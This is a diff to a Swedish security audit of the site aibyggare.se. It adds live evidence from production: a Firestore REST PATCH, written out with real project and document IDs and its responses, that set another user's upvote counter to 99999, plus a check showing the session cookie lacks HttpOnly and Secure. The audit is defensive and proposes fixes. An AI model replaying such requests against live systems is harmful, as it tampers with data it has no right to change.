@@ -6,6 +6,55 @@
 
 ---
 
+## Live-testresultat — hårda bevis (2026-06-29)
+
+Två av de allvarligaste tekniska påståendena har verifierats mot produktion med faktiska anrop. Testkonto skapades och raderades i samma session — ingen permanent testdata kvar.
+
+### Bevis 1 — Counter-manipulation
+
+```
+Testkonto: security-test-1782760122@delete.test (UID: otpK794mc8XIMkgq6ZQrTuSezFl1)
+Mål: projects/5kA7T8rt8P0f10YWvht4 (BTC Edge, ägare: seed_pelle)
+
+FÖRE attack:  upvoteCount = 9   (verifierat via public GET)
+
+ANGREPP (Firestore REST API PATCH, enbart upvoteCount-fältet):
+  → HTTP 200 OK
+  → Svar: {"fields": {"upvoteCount": {"integerValue": "99999"}}}
+  → Direkt GET mot DB: upvoteCount = 99999  ✓ bekräftat skrivet
+
+EFTER återställning: upvoteCount = 9   ✓
+Testkonto raderat: INVALID_LOGIN_CREDENTIALS vid inloggningsförsök  ✓
+```
+**Slutsats:** BEKRÄFTAD SÅRBARHET. Ingen kod-tolkning — faktisk databasmanipulation utförd och verifierad.
+
+---
+
+### Bevis 2 — Cookie-flaggor
+
+```
+Metod: Playwright headless Chrome mot https://aibyggare.se/login
+Inloggning: testkonto ovan (godkändes direkt — inga email-krav)
+
+Set-Cookie header från server:  INGEN (curl -I https://aibyggare.se/ visar inga Set-Cookie)
+__session sätts enbart client-side via document.cookie i AuthContext.tsx:165
+
+Faktiska cookie-attribut (Playwright cookie inspector):
+  name:     __session
+  domain:   aibyggare.se
+  path:     /
+  httpOnly: False   ← tokenen är läsbar för JavaScript på sidan
+  secure:   False   ← cookien skickas även om HTTP används
+  sameSite: Lax
+  expires:  1 h (matchar JWT exp-claim)
+
+Verifiering JS-läsbarhet:
+  document.cookie innehöll "__session=eyJhbGciOiJSUzI1NiIsImtpZCI6..." → BEKRÄFTAD ej HttpOnly
+```
+**Slutsats:** BEKRÄFTAT. Cookien saknar HttpOnly och Secure. En XSS-sårbarhet (i egenkod eller tredjepartsskript) kan stjäla Firebase ID-token och använda den direkt mot alla API-routes och Firestore REST API.
+
+---
+
 ## Sammanfattande helhetsbedömning
 
 ### Säkerhet — **6 / 10**
@@ -37,13 +86,27 @@ Läget är allvarligt. Sajten saknar integritetspolicy, användarvillkor, och co
 | `bookmarks` | ✅ Korrekt | Strikt ägarskydd — `resource.data.userId == request.auth.uid` på läsning |
 | `reports` | ✅ Korrekt | Enbart admin kan läsa; rapportör kan enbart skapa |
 
-**Konkret brist — Counter-manipulation:**  
+**Konkret brist — Counter-manipulation (LIVE-BEVISAD 2026-06-29):**  
 Regeln för `projects` och `posts` innehåller:
 ```
 || (isSignedIn()
     && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['upvoteCount', 'commentCount']));
 ```
-Detta tillåter valfri inloggad användare att sätta `upvoteCount` och `commentCount` till **godtyckliga värden** direkt via Firebase JS SDK — det räcker med en `updateDoc()` som enbart ändrar dessa fält. Applikationens transaktion (±1) kringgås enkelt. En angripare kan sätta ett projekts `upvoteCount` till 999 999 eller `commentCount` till 0.
+Detta tillåter valfri inloggad användare att sätta `upvoteCount` och `commentCount` till **godtyckliga värden** direkt via Firebase JS SDK — det räcker med ett Firestore REST API PATCH-anrop som enbart ändrar dessa fält. Applikationens transaktion (±1) kringgås enkelt.
+
+**Testat live mot produktion** (2026-06-29, temporärt testkonto `security-test-1782760122@delete.test`, UID `otpK794mc8XIMkgq6ZQrTuSezFl1`, raderat efteråt):
+```
+# Mål: projects/5kA7T8rt8P0f10YWvht4 (BTC Edge, ägare seed_pelle, upvoteCount=9)
+# Angrepp: PATCH med enbart upvoteCount-fältet från ett icke-ägar-konto
+PATCH https://firestore.googleapis.com/v1/projects/aibyggare-c45c6/databases/(default)/documents/projects/5kA7T8rt8P0f10YWvht4?updateMask.fieldPaths=upvoteCount
+Authorization: Bearer {testuser-idToken}
+Body: {"fields": {"upvoteCount": {"integerValue": "99999"}}}
+
+Svar: HTTP 200 — {"fields": {"upvoteCount": {"integerValue": "99999"}}}
+Direkt verifiering mot DB: upvoteCount läst som 99999 (bekräftat skrivet)
+Återställt till 9 via samma metod. Testkonto raderat.
+```
+**Slutsats:** Bekräftat exploiterbart. En angripare med ett legitimt konto kan manipulera sortering och synlig popularitet för valfritt projekt eller post.
 
 **Positiv obs:** `isAdmin()`-funktionen läser profile-dokumentet vid varje anrop. Korrekt, men bör noteras att en komprometterad admin-session i webbläsaren inte kan eskalera vidare via Firestore direkt (role-fältet är låst).
 
@@ -53,7 +116,7 @@ Detta tillåter valfri inloggad användare att sätta `upvoteCount` och `comment
 
 | Yta / Funktion | Allvarlighetsgrad | Fynd | Rekommenderad åtgärd |
 |---|---|---|---|
-| **Session cookie — HttpOnly/Secure** | 🔴 HÖG | Cookie `__session` sätts via `document.cookie` i `AuthContext.tsx:165`. Saknar `HttpOnly` och `Secure`. JavaScript kan läsa cookien — om XSS uppnås kan Firebase ID-token stjälas. | Skapa server-side API-route (`/api/auth/session`) som sätter cookien med `Set-Cookie: __session=...; HttpOnly; Secure; SameSite=Lax` via Firebase Admin `createSessionCookie()`. |
+| **Session cookie — HttpOnly/Secure** | 🔴 HÖG | Cookie `__session` sätts via `document.cookie` i `AuthContext.tsx:165`. **Live-verifierat mot produktion (2026-06-29):** `httpOnly: False`, `secure: False`, `sameSite: Lax`. Cookien är läsbar via `document.cookie` i webbläsarens JavaScript. Servern sätter INGEN `Set-Cookie`-header — cookien existerar enbart som client-side JS-cookie. Innehåller en giltig Firebase ID-token (RS256 JWT, 1 h giltighetstid) som ger full API-åtkomst om den stjäls. | Skapa server-side API-route (`/api/auth/session`) som sätter cookien med `Set-Cookie: __session=...; HttpOnly; Secure; SameSite=Lax` via Firebase Admin `createSessionCookie()`. |
 | **Rate limiting — API-routes** | 🔴 HÖG | Ingen av de 8 API-routes har rate limiting. `/api/notify` kan spamma notiser till andra användare. `/api/feedback` kan skicka tusentals stora meddelanden + bilduppladdningar (6 MB/req → kostnad). `/api/xp/grant` är idempotent per event-typ men event-rymden är inte begränsad. | Implementera rate limiting via Upstash Redis + `@upstash/ratelimit` eller Vercel KV. Prioritet: `/api/notify` och `/api/feedback`. |
 | **Counter-manipulation (Firestore Rules)** | 🟡 MEDEL | Inloggad användare kan sätta `upvoteCount`/`commentCount` till godtyckligt värde på alla projekt och posts (se detalj ovan). | Ta bort regeln som tillåter klientuppdatering av räknarna. Flytta upvote/kommentar-räkning till server-side API-routes som använder Admin SDK med `FieldValue.increment()`. |
 | **HTTP Security Headers** | 🟡 MEDEL | `next.config.ts` definierar inga `headers()`. Saknas: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`. | Lägg till `async headers()` i `next.config.ts`. Börja med `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. CSP är komplexare (Firebase/Vercel kräver undantag) men bör planeras. |
